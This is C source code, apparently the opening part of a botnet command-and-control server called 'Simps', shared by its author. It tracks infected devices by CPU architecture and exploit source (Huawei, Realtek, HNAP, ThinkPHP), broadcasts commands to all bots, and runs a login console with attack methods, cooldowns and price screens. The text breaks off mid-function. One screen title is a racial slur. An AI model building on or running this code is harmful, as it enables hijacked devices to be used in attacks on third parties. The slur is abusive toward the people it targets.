/*

*  Simps Botnet c2 made by: ur0a
*  ig: @ur0a_
*  last thing: im not really good at coding so some of the code might work weird and look weird but it works. 

*/

#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <inttypes.h>
#include <string.h>
#include <strings.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netdb.h>
#include <unistd.h>
#include <time.h>
#include <fcntl.h>
#include <sys/epoll.h>
#include <errno.h>
#include <pthread.h>
#include <signal.h>
#include <arpa/inet.h>
#include <ctype.h>

/*-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------*/

#define MAXFDS 1000000
#define CncPort 55555
#define authkey "!ICECREAM"
#define telcon "Telnet Connection"

/*-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------*/

char motd[2048];
char *datafd;
char *ipinfo[800];
char *cnc_port = "55555";
char *bot_port = "65525";

/*-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------*/

char *telconn[] =
	{
		"23\0"};

/*-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------*/

struct login_info
{
	char username[100];
	char password[100];
	char id[200];
	int maxtime;
	int cooldown;
	char expiry[100];
};

/*-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------*/

static struct login_info accounts[100];
struct clientdata_t
{
	char arch[1024];
	char joinname[1024];
	char build[1024];
	uint32_t ip;
	char x86_64;
	char i586;
	char mips;
	char mipsel;
	char armv4l;
	char armv5l;
	char armv6l;
	char armv7l;
	char powerpc;
	char sparc;
	char m68k;
	char i686;
	char sh4;
	char hnap;
	char realtek;
	char huawei;
	char x11;
	char archARM;
	char xDLS;
	char yarn;
	char ThinkPHP;
	char unknown;
	char connected;
} clients[MAXFDS];
unsigned int x86_64 = 0;
unsigned int i586 = 0;
unsigned int mips = 0;
unsigned int mipsel = 0;
unsigned int armv4l = 0;
unsigned int armv5l = 0;
unsigned int armv6l = 0;
unsigned int armv7l = 0;
unsigned int powerpc = 0;
unsigned int sparc = 0;
unsigned int m68k = 0;
unsigned int i686 = 0;
unsigned int sh4 = 0;
unsigned int hnap = 0;
unsigned int realtek = 0;
unsigned int huawei = 0;
unsigned int x11 = 0;
unsigned int archARM = 0;
unsigned int xDLS = 0;
unsigned int yarn = 0;
unsigned int ThinkPHP = 0;
unsigned int unknown = 0;

/*-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------*/

struct telnetdata_t
{
	char my_ip[100];
	char ip[500];
	char username[30];
	char password[30];
	char id[30];
	int maxtime;
	int cooldown;
	int connected;
	int CoolDownStatus;
	int CoolDownSecs;
	char expiry[100];
} managements[MAXFDS];

/*-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------*/

struct toast
{
	char string[240];
	int login;
	int just_logged_in;
} Title[MAXFDS];

/*-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------*/

struct CoolDownArgs
{
	int sock;
	int seconds;
	uint32_t ip;
};

/*-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------*/

struct telstate_t
{
	int datafd;
	unsigned int ip;
	unsigned char state;
	unsigned char complete;
	unsigned char usernameInd;
	unsigned short bufUsed;
	char *sockbuf;
};

/*-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------*/

int EpollFD = 0;
int ListenFD = 0;
int UsersConnected = 0;
int UsersLogged = 0;
int UsersAttacks = 0;
int scannerreport;
int DupesDeleted = 0;
int ToggleAttacks = 0;
int motdlol = 0;
static int client_fd = -1;
static int admin_fd = -1;
static int efd = -1;

/*-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------*/

int fdgets(unsigned char *buffer, int bufferSize, int fd)
{
	int total = 0, got = 1;
	while (got == 1 && total < bufferSize && *(buffer + total - 1) != '\n')
	{
		got = read(fd, buffer + total, 1);
		total++;
	}
	return got;
}

/*-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------*/

void StartCldown(void *arguments)
{
	struct CoolDownArgs *args = arguments;
	int fd = (int)args->sock;
	int seconds = (int)args->seconds;
	managements[fd].CoolDownStatus = 1;
	time_t start = time(NULL);
	while (managements[fd].CoolDownSecs++ < seconds)
		sleep(1);
	managements[fd].CoolDownStatus = 0;
	managements[fd].CoolDownSecs = 0;
	return;
}

/*-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------*/

void removestr(char *buf, const char *rev)
{
	buf = strstr(buf, rev);
	memmove(buf, buf + strlen(rev), 1 + strlen(buf + strlen(rev)));
}

/*-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------*/

void trim(char *str)
{
	int i;
	int begin = 0;
	int end = strlen(str) - 1;
	while (isspace(str[begin]))
		begin++;
	while ((end >= begin) && isspace(str[end]))
		end--;
	for (i = begin; i <= end; i++)
		str[i - begin] = str[i];
	str[i - begin] = '\0';
}

/*-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------*/

const char *Get_Host(uint32_t addr)
{
	struct in_addr in_addr_ip;
	in_addr_ip.s_addr = addr;
	return inet_ntoa(in_addr_ip);
}

/*-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------*/

static int make_socket_non_blocking(int sfd)
{
	int flags, s;
	flags = fcntl(sfd, F_GETFL, 0);
	if (flags == -1)
	{
		perror("fcntl");
		return -1;
	}
	flags |= O_NONBLOCK;
	s = fcntl(sfd, F_SETFL, flags);
	if (s == -1)
	{
		perror("fcntl");
		return -1;
	}
	return 0;
}

/*-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------*/

int resolvehttp(char *, char *);
int resolvehttp(char *site, char *ip)
{
	struct hostent *he;
	struct in_addr **addr_list;
	int i;
	if ((he = gethostbyname(site)) == NULL)
	{
		herror("gethostbyname");
		return 1;
	}
	addr_list = (struct in_addr **)he->h_addr_list;
	for (i = 0; addr_list[i] != NULL; i++)
	{
		strcpy(ip, inet_ntoa(*addr_list[i]));
		return 0;
	}
	return 1;
}

/*-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------*/

static int create_and_bind(char *port)
{
	struct addrinfo hints;
	struct addrinfo *result, *rp;
	int s, sfd;
	memset(&hints, 0, sizeof(struct addrinfo));
	hints.ai_family = AF_UNSPEC;
	hints.ai_socktype = SOCK_STREAM;
	hints.ai_flags = AI_PASSIVE;
	s = getaddrinfo(NULL, port, &hints, &result);
	if (s != 0)
	{
		fprintf(stderr, "getaddrinfo: %s\n", gai_strerror(s));
		return -1;
	}
	for (rp = result; rp != NULL; rp = rp->ai_next)
	{
		sfd = socket(rp->ai_family, rp->ai_socktype, rp->ai_protocol);
		if (sfd == -1)
			continue;
		int yes = 1;
		if (setsockopt(sfd, SOL_SOCKET, SO_REUSEADDR, &yes, sizeof(int)) == -1)
			perror("setsockopt");
		s = bind(sfd, rp->ai_addr, rp->ai_addrlen);
		if (s == 0)
		{
			break;
		}
		close(sfd);
	}
	if (rp == NULL)
	{
		fprintf(stderr, "Could not bind\n");
		return -1;
	}
	freeaddrinfo(result);
	return sfd;
}

/*-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------*/

void *broadcast(char *msg)
{
	int i;
	for (i = 0; i < MAXFDS; i++)
	{
		if (clients[i].connected)
		{
			send(i, msg, strlen(msg), MSG_NOSIGNAL);
			send(i, "\r\n", strlen("\r\n"), MSG_NOSIGNAL);
		}
	}
}

/*-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------*/

void *BotEventLoop(void *useless)
{
	struct epoll_event event;
	struct epoll_event *events;
	int s;
	events = calloc(MAXFDS, sizeof event);
	while (1)
	{
		int n, i;
		n = epoll_wait(EpollFD, events, MAXFDS, -1);
		for (i = 0; i < n; i++)
		{
			if ((events[i].events & EPOLLERR) || (events[i].events & EPOLLHUP) || (!(events[i].events & EPOLLIN)))
			{
				clients[events[i].data.fd].connected = 0;
				clients[events[i].data.fd].x86_64 = 0;
				clients[events[i].data.fd].i586 = 0;
				clients[events[i].data.fd].mips = 0;
				clients[events[i].data.fd].mipsel = 0;
				clients[events[i].data.fd].armv4l = 0;
				clients[events[i].data.fd].armv5l = 0;
				clients[events[i].data.fd].armv6l = 0;
				clients[events[i].data.fd].armv7l = 0;
				clients[events[i].data.fd].powerpc = 0;
				clients[events[i].data.fd].sparc = 0;
				clients[events[i].data.fd].m68k = 0;
				clients[events[i].data.fd].i686 = 0;
				clients[events[i].data.fd].sh4 = 0;
				clients[events[i].data.fd].hnap = 0;
				clients[events[i].data.fd].realtek = 0;
				clients[events[i].data.fd].huawei = 0;
				clients[events[i].data.fd].x11 = 0;
				clients[events[i].data.fd].archARM = 0;
				clients[events[i].data.fd].xDLS = 0;
				clients[events[i].data.fd].yarn = 0;
				clients[events[i].data.fd].ThinkPHP = 0;
				clients[events[i].data.fd].unknown = 0;
				close(events[i].data.fd);
				continue;
			}
			else if (ListenFD == events[i].data.fd)
			{
				while (1)
				{
					struct sockaddr in_addr;
					socklen_t in_len;
					int infd, ipIndex;

					in_len = sizeof in_addr;
					infd = accept(ListenFD, &in_addr, &in_len);
					if (infd == -1)
					{
						if ((errno == EAGAIN) || (errno == EWOULDBLOCK))
							break;
						else
						{
							perror("accept");
							break;
						}
					}
					clients[infd].ip = ((struct sockaddr_in *)&in_addr)->sin_addr.s_addr;
					int dup = 0;
					for (ipIndex = 0; ipIndex < MAXFDS; ipIndex++)
					{
						if (!clients[ipIndex].connected || ipIndex == infd)
							continue;
						if (clients[ipIndex].ip == clients[infd].ip)
						{
							dup = 1;
							break;
						}
					}
					if (dup)
					{
						DupesDeleted++;
						continue;
					}
					s = make_socket_non_blocking(infd);
					if (s == -1)
					{
						close(infd);
						break;
					}
					event.data.fd = infd;
					event.events = EPOLLIN | EPOLLET;
					s = epoll_ctl(EpollFD, EPOLL_CTL_ADD, infd, &event);
					if (s == -1)
					{
						perror("epoll_ctl");
						close(infd);
						break;
					}
					clients[infd].connected = 1;
				}
				continue;
			}
			else
			{
				int datafd = events[i].data.fd;
				struct clientdata_t *client = &(clients[datafd]);
				int done = 0;
				client->connected = 1;
				client->x86_64 = 0;
				client->i586 = 0;
				client->mips = 0;
				client->mipsel = 0;
				client->armv4l = 0;
				client->armv5l = 0;
				client->armv6l = 0;
				client->armv7l = 0;
				client->powerpc = 0;
				client->sparc = 0;
				client->m68k = 0;
				client->i686 = 0;
				client->sh4 = 0;
				client->hnap = 0;
				client->realtek = 0;
				client->huawei = 0;
				client->x11 = 0;
				client->archARM = 0;
				client->xDLS = 0;
				client->yarn = 0;
				client->ThinkPHP = 0;
				client->unknown = 0;
				while (1)
				{
					ssize_t count;
					char buf[2048];
					memset(buf, 0, sizeof buf);
					while (memset(buf, 0, sizeof buf) && (count = fdgets(buf, sizeof buf, datafd)) > 0)
					{
						if (strstr(buf, "\n") == NULL)
						{
							done = 1;
							break;
						}
						trim(buf);
						if (strstr(buf, "x86_64") == buf)
						{
							client->x86_64 = 1;
						}
						if (strstr(buf, "i586") == buf)
						{
							client->i586 = 1;
						}
						if (strstr(buf, "mips") == buf)
						{
							client->mips = 1;
						}
						if (strstr(buf, "mipsel") == buf)
						{
							client->mipsel = 1;
						}
						if (strstr(buf, "armv4l") == buf)
						{
							client->armv4l = 1;
						}
						if (strstr(buf, "armv5l") == buf)
						{
							client->armv5l = 1;
						}
						if (strstr(buf, "armv6l") == buf)
						{
							client->armv6l = 1;
						}
						if (strstr(buf, "armv7l") == buf)
						{
							client->armv7l = 1;
						}
						if (strstr(buf, "powerpc") == buf)
						{
							client->powerpc = 1;
						}
						if (strstr(buf, "sparc") == buf)
						{
							client->sparc = 1;
						}
						if (strstr(buf, "m68k") == buf)
						{
							client->m68k = 1;
						}
						if (strstr(buf, "i686") == buf)
						{
							client->i686 = 1;
						}
						if (strstr(buf, "sh4") == buf)
						{
							client->sh4 = 1;
						}
						if (strstr(buf, "hnap") == buf)
						{
							client->hnap = 1;
						}
						if (strstr(buf, "realtek") == buf)
						{
							client->realtek = 1;
						}
						if (strstr(buf, "huawei") == buf)
						{
							client->huawei = 1;
						}
						if (strstr(buf, "11") == buf)
						{
							client->x11 = 1;
						}
						if (strstr(buf, "arch ARM") == buf)
						{
							client->archARM = 1;
						}
						if (strstr(buf, "xDLS") == buf)
						{
							client->xDLS = 1;
						}
						if (strstr(buf, "yarn") == buf)
						{
							client->yarn = 1;
						}
						if (strstr(buf, "ThinkPHP") == buf)
						{
							client->ThinkPHP = 1;
						}
						if (strstr(buf, "unknown") == buf)
						{
							client->unknown = 1;
						}
						char ip[1024];
						sprintf(ip, "%d.%d.%d.%d", clients[datafd].ip & 255, clients[datafd].ip >> 8 & 255, clients[datafd].ip >> 16 & 255, clients[datafd].ip >> 24 & 255);
						printf("\e[31m[\e[95m+\e[31m]\e[95m Connection Established\e[31m (\e[95m%s\e[31m:\e[95m%s\e[31m)\e[95m!\r\n", ip, buf);
					}
					if (count == -1)
					{
						if (errno != EAGAIN)
						{
							done = 1;
						}
						break;
					}
					else if (count == 0)
					{
						done = 1;
						break;
					}
				}
				if (done)
				{
					char buf[1024];
					trim(buf);
					char ip[1024];
					sprintf(ip, "%d.%d.%d.%d", clients[datafd].ip & 255, clients[datafd].ip >> 8 & 255, clients[datafd].ip >> 16 & 255, clients[datafd].ip >> 24 & 255);
					printf("\e[95m[\e[31m-\e[95m]\e[31m Connection Lost\e[95m (\e[31m%s\e[95m)\e[31m!\r\n", ip);
					client->connected = 0;
					client->x86_64 = 0;
					client->i586 = 0;
					client->mips = 0;
					client->mipsel = 0;
					client->armv4l = 0;
					client->armv5l = 0;
					client->armv6l = 0;
					client->armv7l = 0;
					client->powerpc = 0;
					client->sparc = 0;
					client->m68k = 0;
					client->i686 = 0;
					client->sh4 = 0;
					client->hnap = 0;
					client->realtek = 0;
					client->huawei = 0;
					client->x11 = 0;
					client->archARM = 0;
					client->xDLS = 0;
					client->yarn = 0;
					client->ThinkPHP = 0;
					client->unknown = 0;
					close(datafd);
				}
			}
		}
	}
}

/*-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------*/

unsigned int x86_64Connected()
{
	int i = 0, total = 0;
	for (i = 0; i < MAXFDS; i++)
	{
		if (!clients[i].x86_64)
			continue;
		total++;
	}

	return total;
}

/*-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------*/

unsigned int i586Connected()
{
	int i = 0, total = 0;
	for (i = 0; i < MAXFDS; i++)
	{
		if (!clients[i].i586)
			continue;
		total++;
	}

	return total;
}

/*-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------*/

unsigned int mipsConnected()
{
	int i = 0, total = 0;
	for (i = 0; i < MAXFDS; i++)
	{
		if (!clients[i].mips)
			continue;
		total++;
	}

	return total;
}

/*-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------*/

unsigned int mipselConnected()
{
	int i = 0, total = 0;
	for (i = 0; i < MAXFDS; i++)
	{
		if (!clients[i].mipsel)
			continue;
		total++;
	}

	return total;
}

/*-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------*/

unsigned int armv4lConnected()
{
	int i = 0, total = 0;
	for (i = 0; i < MAXFDS; i++)
	{
		if (!clients[i].armv4l)
			continue;
		total++;
	}

	return total;
}

/*-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------*/

unsigned int armv5lConnected()
{
	int i = 0, total = 0;
	for (i = 0; i < MAXFDS; i++)
	{
		if (!clients[i].armv5l)
			continue;
		total++;
	}

	return total;
}

/*-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------*/

unsigned int armv6lConnected()
{
	int i = 0, total = 0;
	for (i = 0; i < MAXFDS; i++)
	{
		if (!clients[i].armv6l)
			continue;
		total++;
	}

	return total;
}

/*-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------*/

unsigned int armv7lConnected()
{
	int i = 0, total = 0;
	for (i = 0; i < MAXFDS; i++)
	{
		if (!clients[i].armv7l)
			continue;
		total++;
	}

	return total;
}

/*-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------*/

unsigned int powerpcConnected()
{
	int i = 0, total = 0;
	for (i = 0; i < MAXFDS; i++)
	{
		if (!clients[i].powerpc)
			continue;
		total++;
	}

	return total;
}

/*-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------*/

unsigned int sparcConnected()
{
	int i = 0, total = 0;
	for (i = 0; i < MAXFDS; i++)
	{
		if (!clients[i].sparc)
			continue;
		total++;
	}

	return total;
}

/*-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------*/

unsigned int m68kConnected()
{
	int i = 0, total = 0;
	for (i = 0; i < MAXFDS; i++)
	{
		if (!clients[i].m68k)
			continue;
		total++;
	}

	return total;
}

/*-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------*/

unsigned int i686Connected()
{
	int i = 0, total = 0;
	for (i = 0; i < MAXFDS; i++)
	{
		if (!clients[i].i686)
			continue;
		total++;
	}

	return total;
}

/*-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------*/

unsigned int sh4Connected()
{
	int i = 0, total = 0;
	for (i = 0; i < MAXFDS; i++)
	{
		if (!clients[i].sh4)
			continue;
		total++;
	}

	return total;
}

/*-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------*/

unsigned int hnapConnected()
{
	int i = 0, total = 0;
	for (i = 0; i < MAXFDS; i++)
	{
		if (!clients[i].hnap)
			continue;
		total++;
	}

	return total;
}

/*-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------*/

unsigned int realtekConnected()
{
	int i = 0, total = 0;
	for (i = 0; i < MAXFDS; i++)
	{
		if (!clients[i].realtek)
			continue;
		total++;
	}

	return total;
}

/*-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------*/

unsigned int huaweiConnected()
{
	int i = 0, total = 0;
	for (i = 0; i < MAXFDS; i++)
	{
		if (!clients[i].huawei)
			continue;
		total++;
	}

	return total;
}

/*-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------*/

unsigned int x11Connected()
{
	int i = 0, total = 0;
	for (i = 0; i < MAXFDS; i++)
	{
		if (!clients[i].x11)
			continue;
		total++;
	}

	return total;
}

/*-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------*/

unsigned int archARMConnected()
{
	int i = 0, total = 0;
	for (i = 0; i < MAXFDS; i++)
	{
		if (!clients[i].archARM)
			continue;
		total++;
	}

	return total;
}

/*-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------*/

unsigned int xDLSConnected()
{
	int i = 0, total = 0;
	for (i = 0; i < MAXFDS; i++)
	{
		if (!clients[i].xDLS)
			continue;
		total++;
	}

	return total;
}

/*-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------*/

unsigned int yarnConnected()
{
	int i = 0, total = 0;
	for (i = 0; i < MAXFDS; i++)
	{
		if (!clients[i].yarn)
			continue;
		total++;
	}

	return total;
}

/*-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------*/

unsigned int ThinkPHPConnected()
{
	int i = 0, total = 0;
	for (i = 0; i < MAXFDS; i++)
	{
		if (!clients[i].ThinkPHP)
			continue;
		total++;
	}

	return total;
}

/*-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------*/

unsigned int unknownConnected()
{
	int i = 0, total = 0;
	for (i = 0; i < MAXFDS; i++)
	{
		if (!clients[i].unknown)
			continue;
		total++;
	}

	return total;
}

/*-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------*/

unsigned int BotsConnected()
{
	int i = 0, total = 0;
	for (i = 0; i < MAXFDS; i++)
	{
		if (!clients[i].connected)
			continue;
		total++;
	}
	return total;
}

/*-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------*/

int Find_Login(char *str)
{
	FILE *fp;
	int line_num = 0;
	int find_result = 0, find_line = 0;
	char temp[512];

	if ((fp = fopen("Login.txt", "r")) == NULL)
	{
		return (-1);
	}
	while (fgets(temp, 512, fp) != NULL)
	{
		if ((strcasestr(temp, str)) != NULL)
		{
			find_result++;
			find_line = line_num;
		}
		line_num++;
	}
	if (fp)
		fclose(fp);
	if (find_result == 0)
		return 0;
	return find_line;
}

/*-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------*/

void checkHostName(int hostname)
{
	if (hostname == -1)
	{
		perror("gethostname");
		exit(1);
	}
}

/*-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------*/

void client_addr(struct sockaddr_in cli)
{
	sprintf(ipinfo, "%d.%d.%d.%d", cli.sin_addr.s_addr & 0xFF, (cli.sin_addr.s_addr & 0xFF00) >> 8, (cli.sin_addr.s_addr & 0xFF0000) >> 16, (cli.sin_addr.s_addr & 0xFF000000) >> 24);
}

/*-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------*/

int countArch(int datafd)
{
	char returnline[2048];
	char buffer[80];
	int x;
	int armvl = 0;
	int total = 0;
	for (x = 0; x < MAXFDS; x++)
	{
		if (strcasestr(clients[x].arch, "x86_64") && clients[x].connected == 1)
		{
			x86_64++;
			total++;
		}
		else if (strcasestr(clients[x].arch, "i586") && clients[x].connected == 1)
		{
			i586++;
			total++;
		}
		else if (strcasestr(clients[x].arch, "armv4l") && clients[x].connected == 1)
		{
			armv4l++;
			total++;
		}
		else if (strcasestr(clients[x].arch, "armv5l") && clients[x].connected == 1)
		{
			armv5l++;
			total++;
		}
		else if (strcasestr(clients[x].arch, "armv6l") && clients[x].connected == 1)
		{
			armv6l++;
			total++;
		}
		else if (strcasestr(clients[x].arch, "armv7l") && clients[x].connected == 1)
		{
			armv7l++;
			total++;
		}
		else if (strcasestr(clients[x].arch, "mipsel") && clients[x].connected == 1)
		{
			mipsel++;
			total++;
		}
		else if (strcasestr(clients[x].arch, "mips") && clients[x].connected == 1)
		{
			mips++;
			total++;
		}
		else if (strcasestr(clients[x].arch, "powerpc") && clients[x].connected == 1)
		{
			powerpc++;
			total++;
		}
		else if (strcasestr(clients[x].arch, "sparc") && clients[x].connected == 1)
		{
			sparc++;
			total++;
		}
		else if (strcasestr(clients[x].arch, "m68k") && clients[x].connected == 1)
		{
			m68k++;
			total++;
		}
		else if (strcasestr(clients[x].arch, "i686") && clients[x].connected == 1)
		{
			i686++;
			total++;
		}
		else if (strcasestr(clients[x].arch, "sh4") && clients[x].connected == 1)
		{
			sh4++;
			total++;
		}
		else if (strcasestr(clients[x].arch, "hnap") && clients[x].connected == 1)
		{
			hnap++;
			total++;
		}
		else if (strcasestr(clients[x].arch, "realtek") && clients[x].connected == 1)
		{
			realtek++;
			total++;
		}
		else if (strcasestr(clients[x].arch, "huawei") && clients[x].connected == 1)
		{
			huawei++;
			total++;
		}
		else if (strcasestr(clients[x].arch, "11") && clients[x].connected == 1)
		{
			x11++;
			total++;
		}
		else if (strcasestr(clients[x].arch, "arch ARM") && clients[x].connected == 1)
		{
			archARM++;
			total++;
		}
		else if (strcasestr(clients[x].arch, "xDLS") && clients[x].connected == 1)
		{
			xDLS++;
			total++;
		}
		else if (strcasestr(clients[x].arch, "yarn") && clients[x].connected == 1)
		{
			yarn++;
			total++;
		}
		else if (strcasestr(clients[x].arch, "ThinkPHP") && clients[x].connected == 1)
		{
			ThinkPHP++;
			total++;
		}
		else if (strcasestr(clients[x].arch, "unknown") && clients[x].connected == 1)
		{
			unknown++;
			total++;
		}
	}
}

/*-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------*/

void *TitleWriter(void *sock)
{
	int find_line;
	int datafd = (int)sock;
	char string[2048];
	while (1)
	{
		memset(string, 0, 2048);
		if (Title[datafd].login == 16)
		{
			sprintf(string, "%c]0;SimpsNet.xyz | Screen: [Authenticating] %c", '\033', '\007');
		}
		if (Title[datafd].login == 1)
		{
			sprintf(string, "%c]0;SimpsNet.xyz | Screen: [Login] %c", '\033', '\007');
		}
		if (Title[datafd].login == 14)
		{
			sprintf(string, "%c]0;SimpsNet.xyz | Screen: [Captcha] %c", '\033', '\007');
		}
		if (Title[datafd].login == 15)
		{
			sprintf(string, "%c]0;SimpsNet.xyz | Screen: [Welcome] %c", '\033', '\007');
		}
		if (Title[datafd].login == 19)
		{
			sprintf(string, "%c]0;SimpsNet.xyz | Screen: [Failed-Login] %c", '\033', '\007');
		}
		if (Title[datafd].login == 17)
		{
			sprintf(string, "%c]0;SimpsNet.xyz | Screen: [Tos] %c", '\033', '\007');
		}
		if (Title[datafd].login == 2)
		{
			sprintf(string, "%c]0;Simps | Servers: [%d] | Devices: [%d] | Users Online: [%d] | Screen: [Home] | Expiry: [%s] %c", '\033', x86_64Connected(), BotsConnected(), UsersConnected, Title[datafd].string, '\007');
		}
		if (Title[datafd].login == 3)
		{
			sprintf(string, "%c]0;Simps | Servers: [%d] | Devices: [%d] | Users Online: [%d] | Screen: [Help] | Expiry: [%s] %c", '\033', x86_64Connected(), BotsConnected(), UsersConnected, Title[datafd].string, '\007');
		}
		if (Title[datafd].login == 4)
		{
			sprintf(string, "%c]0;Simps | Servers: [%d] | Devices: [%d] | Users Online: [%d] | Screen: [Methods] | Expiry: [%s] %c", '\033', x86_64Connected(), BotsConnected(), UsersConnected, Title[datafd].string, '\007');
		}
		if (Title[datafd].login == 5)
		{
			sprintf(string, "%c]0;Simps | Servers: [%d] | Devices: [%d] | Users Online: [%d] | Screen: [Rules] | Expiry: [%s] %c", '\033', x86_64Connected(), BotsConnected(), UsersConnected, Title[datafd].string, '\007');
		}
		if (Title[datafd].login == 6)
		{
			sprintf(string, "%c]0;Simps | Servers: [%d] | Devices: [%d] | Users Online: [%d] | Screen: [Bots] | Expiry: [%s] %c", '\033', x86_64Connected(), BotsConnected(), UsersConnected, Title[datafd].string, '\007');
		}
		if (Title[datafd].login == 7)
		{
			sprintf(string, "%c]0;Simps | Servers: [%d] | Devices: [%d] | Users Online: [%d] | Screen: [Ports] | Expiry: [%s] %c", '\033', x86_64Connected(), BotsConnected(), UsersConnected, Title[datafd].string, '\007');
		}
		if (Title[datafd].login == 8)
		{
			sprintf(string, "%c]0;Simps | Servers: [%d] | Devices: [%d] | Users Online: [%d] | Screen: [Credits] | Expiry: [%s] %c", '\033', x86_64Connected(), BotsConnected(), UsersConnected, Title[datafd].string, '\007');
		}
		if (Title[datafd].login == 9)
		{
			sprintf(string, "%c]0;Simps | Servers: [%d] | Devices: [%d] | Users Online: [%d] | Screen: [Contact] | Expiry: [%s] %c", '\033', x86_64Connected(), BotsConnected(), UsersConnected, Title[datafd].string, '\007');
		}
		if (Title[datafd].login == 10)
		{
			sprintf(string, "%c]0;Simps | Servers: [%d] | Devices: [%d] | Users Online: [%d] | Screen: [Tos] | Expiry: [%s] %c", '\033', x86_64Connected(), BotsConnected(), UsersConnected, Title[datafd].string, '\007');
		}
		if (Title[datafd].login == 11)
		{
			sprintf(string, "%c]0;Simps | Servers: [%d] | Devices: [%d] | Users Online: [%d] | Screen: [Admin] | Expiry: [%s] %c", '\033', x86_64Connected(), BotsConnected(), UsersConnected, Title[datafd].string, '\007');
		}
		if (Title[datafd].login == 12)
		{
			sprintf(string, "%c]0;Simps | Servers: [%d] | Devices: [%d] | Users Online: [%d] | Screen: [Prices] | Expiry: [%s] %c", '\033', x86_64Connected(), BotsConnected(), UsersConnected, Title[datafd].string, '\007');
		}
		if (Title[datafd].login == 13)
		{
			sprintf(string, "%c]0;Simps | Servers: [%d] | Devices: [%d] | Users Online: [%d] | Screen: [Peace Out] | Expiry: [%s] %c", '\033', x86_64Connected(), BotsConnected(), UsersConnected, Title[datafd].string, '\007');
		}
		if (Title[datafd].login == 18)
		{
			sprintf(string, "%c]0;Simps | Servers: [%d] | Devices: [%d] | Users Online: [%d] | Screen: [Stats] | Expiry: [%s] %c", '\033', x86_64Connected(), BotsConnected(), UsersConnected, Title[datafd].string, '\007');
		}
		if (Title[datafd].login == 20)
		{
			sprintf(string, "%c]0;Simps | Servers: [%d] | Devices: [%d] | Users Online: [%d] | Screen: [Banners] | Expiry: [%s] %c", '\033', x86_64Connected(), BotsConnected(), UsersConnected, Title[datafd].string, '\007');
		}
		if (Title[datafd].login == 21)
		{
			sprintf(string, "%c]0;Simps | Servers: [%d] | Devices: [%d] | Users Online: [%d] | Screen: [Niggers] | Expiry: [%s] %c", '\033', x86_64Connected(), BotsConnected(), UsersConnected, Title[datafd].string, '\007');
		}
		if (Title[datafd].login == 22)
		{
			sprintf(string, "%c]0;Simps | Servers: [%d] | Devices: [%d] | Users Online: [%d] | Screen: [America] | Expiry: [%s] %c", '\033', x86_64Connected(), BotsConnected(), UsersConnected, Title[datafd].string, '\007');
		}
		if (Title[datafd].login == 23)
		{
			sprintf(string, "%c]0;Simps | Servers: [%d] | Devices: [%d] | Users Online: [%d] | Screen: [Girl] | Expiry: [%s] %c", '\033', x86_64Connected(), BotsConnected(), UsersConnected, Title[datafd].string, '\007');
		}
		if (Title[datafd].login == 24)
		{
			sprintf(string, "%c]0;Simps | Servers: [%d] | Devices: [%d] | Users Online: [%d] | Screen: [Guns] | Expiry: [%s] %c", '\033', x86_64Connected(), BotsConnected(), UsersConnected, Title[datafd].string, '\007');
		}
		if (Title[datafd].login == 25)
		{
			sprintf(string, "%c]0;Simps | Servers: [%d] | Devices: [%d] | Users Online: [%d] | Screen: [Boobs] | Expiry: [%s] %c", '\033', x86_64Connected(), BotsConnected(), UsersConnected, Title[datafd].string, '\007');
		}
		if (Title[datafd].login == 26)
		{
